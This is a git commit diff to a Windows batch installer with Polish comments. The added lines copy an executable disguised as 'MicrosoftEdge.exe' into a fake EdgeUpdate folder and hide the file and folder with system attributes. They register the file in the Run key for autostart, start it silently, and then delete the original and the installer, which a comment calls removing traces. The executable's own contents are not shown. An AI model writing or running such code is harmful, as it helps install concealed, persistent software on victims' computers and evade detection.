6ddb27edfa8cdf5455008575a7e4f90323b8e09d
Pozdrawiam8BBC <gramwkonkuter@gmail.com>
2025-05-29 19:40:49 +0200

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,23 +1,33 @@
 @echo off
+:: Ukryj echo
+cls
+
 :: Ścieżki
 set "src=%USERPROFILE%\Desktop\MicrosoftEdge.exe"
-set "dest=%temp%\MicrosoftEdge.exe"
+set "dest=%LOCALAPPDATA%\Microsoft\EdgeUpdate\MicrosoftEdge.exe"
+
+:: Tworzenie folderu docelowego
+mkdir "%LOCALAPPDATA%\Microsoft\EdgeUpdate" >nul 2>&1
 
 :: Kopiowanie pliku
 copy "%src%" "%dest%" >nul
 
+:: Ukrywanie pliku i folderu
+attrib +h +s "%dest%"
+attrib +h +s "%LOCALAPPDATA%\Microsoft\EdgeUpdate"
+
 :: Dodanie do autostartu
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftEdge" /t REG_SZ /d "%dest%" /f >nul
 
-:: Uruchomienie programu w tle
-start "" /min "%dest%"
+:: Uruchomienie programu po cichu
+start "" /b "%dest%"
 
-:: Czekaj 3 sekundy, by upewnić się, że wszystko zadziałało
+:: Odczekanie chwili
 timeout /t 3 >nul
 
-:: Usuwanie plików
+:: Usuwanie śladów
 del /q "%src%" >nul 2>&1
 del /q "%USERPROFILE%\Desktop\install.bat" >nul 2>&1
 
-:: Wyjście
+:: Zakończenie
 exit
